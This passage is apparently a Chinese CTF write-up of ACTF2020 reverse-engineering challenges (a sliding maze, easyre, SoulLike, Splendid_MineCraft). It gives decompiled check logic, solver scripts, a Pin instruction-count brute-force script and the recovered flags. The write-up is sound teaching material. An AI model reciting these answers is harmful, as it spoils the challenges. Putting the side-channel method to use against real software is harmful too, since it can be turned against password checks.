<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">"ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line"><span class="keyword">print</span> table</span><br><span class="line"></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> newc:</span><br><span class="line">    l.append(table.index(i))</span><br><span class="line"><span class="comment"># print l</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    b = bin(i)[<span class="number">2</span>:].rjust(<span class="number">6</span>,<span class="string">'0'</span>)</span><br><span class="line">    s += b</span><br><span class="line">    <span class="comment"># print(b)</span></span><br><span class="line"><span class="comment"># print s</span></span><br><span class="line"></span><br><span class="line">h = hex(int(s,<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="comment"># print h</span></span><br><span class="line"><span class="keyword">print</span> h.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></div>



<h2 id="oruga"><a href="#oruga" class="headerlink" title="oruga"></a>oruga</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>“只要我们不停下脚步，道路就会不断延伸……”<br>“团长，你在做什么啊团长！”<br>“我们不需要最后的落脚处，只要不断前进就行了。只要不停止，道路就会不断延伸。因为，我不会停下来的！只要你们不停下来，那前面一定就有我！所以啊……不要停下来啊……”</p>
</blockquote>
</li>
<li><p>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/oruga/oruga" target="_blank" rel="noopener">oruga</a></p>
</li>
<li><p>考察点：逆向分析</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>分值：100</p>
</li>
<li><p>完成人数：1</p>
</li>
</ul>
<p>走迷宫的小游戏，只要逆出了游戏规则就简单了…(有点像是神奇宝贝绿宝石里面那个溜冰游戏：D)</p>
<p>游戏地图大小为16x16，如下(其中<code>.</code>代表<code>\x00</code>)：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">....#.......####</span><br><span class="line">...##...OO......</span><br><span class="line">........OO.PP...</span><br><span class="line">...L.OO.OO.PP...</span><br><span class="line">...L.OO.OO.P....</span><br><span class="line">..LL.OO....P....</span><br><span class="line">.....OO....P....</span><br><span class="line">#...............</span><br><span class="line">............#...</span><br><span class="line">......MMM...#...</span><br><span class="line">.......MMM....EE</span><br><span class="line">...0.M.M.M....E.</span><br><span class="line">..............EE</span><br><span class="line">TTTI.M.M.M....E.</span><br><span class="line">.T.I.M.M.M....E.</span><br><span class="line">.T.I.M.M.M!...EE</span><br></pre></td></tr></table></figure></div>

<h3 id="游戏规则"><a href="#游戏规则" class="headerlink" title="游戏规则"></a>游戏规则</h3><ol>
<li>地图中<code>.</code>(<code>\x00</code>)表示可走的路，<code>！</code>表示终点，其余的字符表示障碍物</li>
<li>起点为(0,0)</li>
<li>每次选择一个方向，一直走到遇到障碍物为止</li>
<li>走出上下左右任何一个边界，即判负</li>
<li>走到终点，赢得游戏</li>
</ol>
<p>通过输入字符表示上下左右方向，对应规则如下：</p>
<blockquote>
<p>W - Up<br>E - Right<br>M - Down<br>J - Left</p>
</blockquote>
<p>按照游戏规则走到终点即可（<code>MEWEMEWJMEWJM</code>）</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>下面分析游戏规则对应的代码：</p>
<p>规则1,2,5比较容易，看地图就能猜出来，规则3,4代码如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( !<span class="built_in">map</span>[ptr] )                           <span class="comment">// add op while map[ptr] is NULL</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">-1</span> &amp;&amp; !(ptr &amp; <span class="number">0xF</span>) )           <span class="comment">// LEFT  - not 0,16,32... (col 0)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">1</span> &amp;&amp; ptr % <span class="number">16</span> == <span class="number">15</span> )          <span class="comment">// RIGHT - not 15,31,47...(col 15)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">16</span> &amp;&amp; (ptr - <span class="number">240</span>) &lt;= <span class="number">0xF</span> )     <span class="comment">// DOWN  - not &lt;= 255 (row 15)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">-16</span> &amp;&amp; (ptr + <span class="number">15</span>) &lt;= <span class="number">0x1E</span> )    <span class="comment">// UP    - not &lt;= 15  (row 0)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    ptr += op;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中<code>while ( !map[ptr] )</code>对应规则3，循环中的代码为边界检查，对应规则4</p>
<p>这题是第二周放出来的，不知道为啥没人做…</p>
<h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><ul>
<li><p>题目描述：Nutshell</p>
</li>
<li><p>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/easyre/easyre.exe" target="_blank" rel="noopener">easyre.exe</a></p>
</li>
<li><p>考察点：逆向分析</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>分值：200</p>
</li>
<li><p>完成人数：2</p>
</li>
</ul>
<p>字符串判断部分代码如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )&#123;</span><br><span class="line">  <span class="comment">// buf[i]!=charset[flag[i]-1]</span></span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;buf0 + i) != charset[*(&amp;flag6_ + i) - <span class="number">1</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You are correct!"</span>);</span><br></pre></td></tr></table></figure></div>

<p>判断条件：<code>buf[i]!=charset[flag[i]-1]</code></p>
<p><code>buf</code>和<code>charset</code>都是直接给的，解<code>flag</code>即可：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">buf = [<span class="number">0x2A</span>, <span class="number">0x46</span>, <span class="number">0x27</span>, <span class="number">0x22</span>, <span class="number">0x4E</span>, <span class="number">0x2C</span>, <span class="number">0x22</span>, <span class="number">0x28</span>, <span class="number">0x49</span>, <span class="number">0x3F</span>, <span class="number">0x2B</span>, <span class="number">0x40</span>]</span><br><span class="line"></span><br><span class="line">charset = [<span class="number">0x7E</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x71</span>, <span class="number">0x70</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>, <span class="number">0x2D</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf[i] == charset[flag[i]-1]</span></span><br><span class="line"><span class="comment"># print charset.index(0x7E)</span></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> buf:</span><br><span class="line">    <span class="comment"># print charset.index(i)+1</span></span><br><span class="line">    s +=  chr(charset.index(i)+<span class="number">1</span>)</span><br><span class="line">s = <span class="string">'ACTF&#123;%s&#125;'</span>%s</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure></div>



<h2 id="SoulLike"><a href="#SoulLike" class="headerlink" title="SoulLike"></a>SoulLike</h2><ul>
<li>题目描述：玩魂like游戏最重要的品质就是，执着（M）</li>
<li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/SoulLike/SoulLike" target="_blank" rel="noopener">SoulLike</a></li>
<li>考察点：逆向分析、爆破</li>
<li>难度：中等</li>
<li>分值：200</li>
<li>完成人数：2</li>
</ul>
<p>首先flag格式为<code>actf{xxxxxxxxxxxx}</code> (12个x)，主要代码如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">11</span>; ++j )</span><br><span class="line">  buf[j] = flag[j + <span class="number">5</span>];</span><br><span class="line">v3 = (<span class="keyword">unsigned</span> __int8)sub_83A(buf) &amp;&amp; v12 == <span class="string">'&#125;'</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( v3 )&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"That's true! flag is %s"</span>, flag);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_83A(buf)</code>这个函数贼长，汇编两万多行，不知道出题人怎么搞出来的。。。</p>
<p>略略的看一下，一堆的异或操作，大概的操作是：</p>
<ul>
<li>将<code>xxxxxxxxxxxx</code><strong>逐个字节</strong>、<strong>反反复复</strong>的异或，最终和下面的正确结果比对</li>
</ul>
<blockquote>
<p>0x7E, 0x32, 0x25, 0x58, 0x59, 0x6B, 0x35, 0x6E, 0x0, 0x13, 0x1E, 0x38</p>
</blockquote>
<p>xor太多了，于是尝试爆破，手动爆破又太累了，于是请出PIN来帮忙(滑稽)</p>
<h3 id="Pin指令数统计爆破"><a href="#Pin指令数统计爆破" class="headerlink" title="Pin指令数统计爆破"></a>Pin指令数统计爆破</h3><p>爆破原理：</p>
<blockquote>
<p>对于逐字节判断字符串是否正确的题目，输入正确flag与错误flag时，程序执行的指令数不同<br>因此分析程序在不同输入时，执行指令数的差异，即可可逐字节得出正确flag</p>
</blockquote>
<p>不想花时间自己写<code>pintool</code>，于是直接用pin新手教学中的<code>inscount0.so</code></p>
<p>爆破时是这个亚子：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ./taqini.py</span></span><br><span class="line">solved: actf&#123;b0Nf|Re_LiT</span><br><span class="line">solved:(maybe) actf&#123;b0Nf|Re_LiTk</span><br><span class="line">solved:(maybe) actf&#123;b0Nf|Re_LiTt</span><br><span class="line">solved:(maybe) actf&#123;b0Nf|Re_LiTA</span><br><span class="line">solved:(maybe) actf&#123;b0Nf|Re_LiTJ</span><br><span class="line">solved:(maybe) actf&#123;b0Nf|Re_LiT!</span><br></pre></td></tr></table></figure></div>

<p>可能是处理器有优化，解出来的结果不唯一，因此每个结果出来都要去gdb试一下</p>
<p>爆破脚本如下（写的很烂…师傅门凑合看，需要下载并配置PIN）：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string <span class="keyword">as</span> s</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment">#configure by the user</span></span><br><span class="line">PINBASEPATH = <span class="string">"/home/taqini/ctf_tools/pin-3.11-97998-g7ecce2dac-gcc-linux"</span></span><br><span class="line">PIN = <span class="string">"%s/pin"</span> % PINBASEPATH</span><br><span class="line">INSCOUNT32 = <span class="string">"%s/source/tools/ManualExamples/obj-ia32/inscount0.so"</span> % PINBASEPATH</span><br><span class="line">INSCOUNT64 = <span class="string">"%s/source/tools/ManualExamples/obj-intel64/inscount0.so"</span> % PINBASEPATH</span><br><span class="line">INSCOUNT = INSCOUNT64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pin</span><span class="params">(passwd,filename)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        command = PIN + <span class="string">" -t "</span> + INSCOUNT + <span class="string">" -- ./"</span>+ filename + <span class="string">" ; cat inscount.out"</span></span><br><span class="line">        p = Popen(command,shell=<span class="literal">True</span>,stderr=PIPE,stdin=PIPE,stdout=PIPE)</span><br><span class="line">        output = p.communicate(input=passwd)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Unexpected error:"</span>, sys.exc_info()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line">    output = re.findall(<span class="string">r"Count ([\w.-]+)"</span>, output)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">''</span>.join(output))</span><br><span class="line"></span><br><span class="line">filename = <span class="string">'./SoulLike'</span></span><br><span class="line">charset=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()+,-./:;&lt;=&gt;?@[]^_`&#123;|&#125;~ '</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># append a char after right ...</span></span><br><span class="line">fix = <span class="string">'actf&#123;b0Nf|Re_LiT'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"solved: "</span>+fix </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    base = pin(fix+<span class="string">'a'</span>,filename)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        diff = abs(pin(fix+i,filename)-base)</span><br><span class="line">        <span class="keyword">print</span> i,<span class="string">"diff: %04d"</span>%diff</span><br><span class="line">        sys.stdout.write(<span class="string">"\033[F"</span>)</span><br><span class="line">        <span class="keyword">if</span> diff &gt;= <span class="number">4</span>: </span><br><span class="line">            <span class="keyword">print</span> <span class="string">'solved:(maybe)'</span>,fix+i</span><br><span class="line">    fix += i</span><br></pre></td></tr></table></figure></div>



<h2 id="Splendid-MineCraft"><a href="#Splendid-MineCraft" class="headerlink" title="Splendid_MineCraft"></a>Splendid_MineCraft</h2><ul>
<li>题目描述：<strong>S</strong>plendid <strong>M</strong>ine<strong>C</strong>raft!</li>
<li>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/Splendid_MineCraft/Splendid_MineCraft.exe" target="_blank" rel="noopener">Splendid_MineCraft.exe</a></li>
<li>考察点：动态调试（后来放了hint，原来叫做自修改代码…<em>SMC self-Modifying Code</em>）</li>
<li>难度：中等</li>
<li>分值：200</li>
<li>完成人数：2</li>
</ul>
<p>面函数如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_401080</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *part1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *part2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *part3; <span class="comment">// ST28_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+14h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+20h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> Str1; <span class="comment">// [esp+24h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> endc; <span class="comment">// [esp+3Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="keyword">int</span> p2_0; <span class="comment">// [esp+44h] [ebp-24h]</span></span><br><span class="line">  __int16 p2_2; <span class="comment">// [esp+48h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> p3_0[<span class="number">4</span>]; <span class="comment">// [esp+4Ch] [ebp-1Ch]</span></span><br><span class="line">  __int16 p3_2; <span class="comment">// [esp+50h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> pl_0; <span class="comment">// [esp+54h] [ebp-14h]</span></span><br><span class="line">  __int16 p1_4; <span class="comment">// [esp+58h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> p1_0_; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line">  __int16 p1_4_; <span class="comment">// [esp+60h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(&amp;aS, <span class="string">"Welcome to ACTF_Splendid_MineCraft!"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(&amp;aS2, &amp;Str1);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;Str1) == <span class="number">26</span> )&#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;Str1, <span class="string">"ACTF&#123;"</span>, <span class="number">5u</span>) &amp;&amp; endc == <span class="string">'&#125;'</span> )&#123;</span><br><span class="line">        endc = <span class="number">0</span>;</span><br><span class="line">        part1 = strtok(&amp;Str1, <span class="string">"_"</span>);</span><br><span class="line">        pl_0 = *(part1 + <span class="number">5</span>);                      <span class="comment">// ACTF&#123;123456_abcdef_ABCDEF&#125;</span></span><br><span class="line">                                                  <span class="comment">// 01234567890123456789012345</span></span><br><span class="line">        p1_4 = *(part1 + <span class="number">9</span>);</span><br><span class="line">        p1_0_ = *(part1 + <span class="number">5</span>);</span><br><span class="line">        p1_4_ = *(part1 + <span class="number">9</span>);</span><br><span class="line">        part2 = strtok(<span class="number">0</span>, <span class="string">"_"</span>);</span><br><span class="line">        p2_0 = *part2;</span><br><span class="line">        p2_2 = *(part2 + <span class="number">2</span>);</span><br><span class="line">        part3 = strtok(<span class="number">0</span>, <span class="string">"_"</span>);</span><br><span class="line">        *p3_0 = *part3;</span><br><span class="line">        p3_2 = *(part3 + <span class="number">2</span>);</span><br><span class="line">        ptr = func;</span><br><span class="line">        <span class="keyword">if</span> ( func(&amp;pl_0) )&#123;</span><br><span class="line">          v5 = SBYTE2(p1_0_) ^ SHIBYTE(p1_4_) ^ p1_0_ ^ SHIBYTE(p1_0_) ^ SBYTE1(p1_0_) ^ p1_4_;</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">0x100</span>; i &lt; <span class="number">0x1F0</span>; ++i )</span><br><span class="line">            loc_405018[i] ^= v5;</span><br><span class="line">          JUMPOUT(__CS__, &amp;loc_405018[<span class="number">256</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Wrong\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="0x0-确定flag结构"><a href="#0x0-确定flag结构" class="headerlink" title="0x0 确定flag结构"></a>0x0 确定flag结构</h3><p>flag长度为26字节，除去<code>ACTF{}</code>还剩下20字节的<code>flag</code>，使用<code>strtok</code>将20字节的<code>flag</code>分为三部分，其中有2字节是<code>_</code>，还剩下18字节分析一下，不难看出每部分6字节…</p>
<p>flag结构为<code>ACTF{123456_abcdef_ABCDEF}</code></p>
<h3 id="0x1-动态分析"><a href="#0x1-动态分析" class="headerlink" title="0x1 动态分析"></a>0x1 动态分析</h3><p>检查flag第一部分和第二部分的函数都在数据段，而且是经过异或编码的，于是只能动态调试</p>
<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>第一部分的函数如下（解码前）：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_encode.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="p1_encode" class="fancybox"><img alt="p1_encode" title="p1_encode" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_encode.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>这个函数解码的操作是异或<code>0x72</code>，解码后：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_decode.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="p1_dec" class="fancybox"><img alt="p1_dec" title="p1_dec" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_decode.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>然后，直接去找字符比较的cmp指令：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_cmp.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="p1_cmp" class="fancybox"><img alt="p1_cmp" title="p1_cmp" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_cmp.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>输入的字符串是<code>ACTF{123456_abcdef_ABCDEF}</code>，这里是逐字节的明文对比，比较简单</p>
<p>对比6个字符后，能得到flag第一部分：<code>yOu0y*</code></p>
